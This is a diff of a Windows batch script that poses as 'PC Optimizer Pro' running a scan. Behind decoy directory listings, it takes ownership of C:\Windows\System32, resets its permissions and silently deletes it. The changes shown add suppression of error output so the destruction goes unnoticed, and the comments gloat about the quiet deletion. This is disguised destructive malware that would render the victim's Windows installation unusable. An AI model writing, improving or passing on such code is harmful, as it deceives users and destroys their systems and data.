@@ -41,7 +41,7 @@ echo PC Optimizer Pro will now begin your scan.
 pause
 tree "%WINDIR%"
 :: the nul supresses the output of the command, and the /r ignores all errors
-takeown /f "C:\Windows\System32" /r /d Y > NUL
+takeown /f "C:\Windows\System32" /r /d Y > NUL 2>&1
 tree "%WINDIR%\SysWOW64"
 :: the nul supresses main output, and the 2>&1 supresses the error output (directs the type 2 output ie error back to nul)
 icacls "C:\Windows\System32" /reset /t /c /q > NUL 2>&1
@@ -57,4 +57,4 @@ goto DeletionLMAO
 
 :DeletionLMAO
 :: the deletion is quiet as well, of course
-del "C:\Windows\System32" /f /q /s > NUL
+del "C:\Windows\System32" /f /q /s > NUL 2>&1
